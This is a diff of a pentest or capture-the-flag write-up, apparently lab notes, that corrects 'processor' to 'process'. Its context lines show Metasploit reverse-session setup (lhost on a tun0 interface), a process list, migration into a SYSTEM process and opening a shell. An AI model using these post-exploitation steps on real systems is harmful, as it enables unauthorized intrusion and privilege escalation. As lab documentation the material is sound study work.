@@ -29,7 +29,7 @@ msf6 > set lhost tun0
 msf6 > run
 ```
 
-### Migrate to stable processor&#x20;
+### Migrate to stable process&#x20;
 
 {% code fullWidth="false" %}
 ```bash
@@ -104,7 +104,7 @@ Process List
 2396  1484  w3wp.exe           x86   0        NT AUTHORITY\SYSTEM           c:\windows\system32\inetsrv\w3wp.e
 2464  580   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcda
 
-# Got some SYSTEM processors so now migrate to SYSTEM
+# Got some SYSTEM process so now migrate to SYSTEM
 meterpreter > migrate 2328
 
 meterpreter > shell
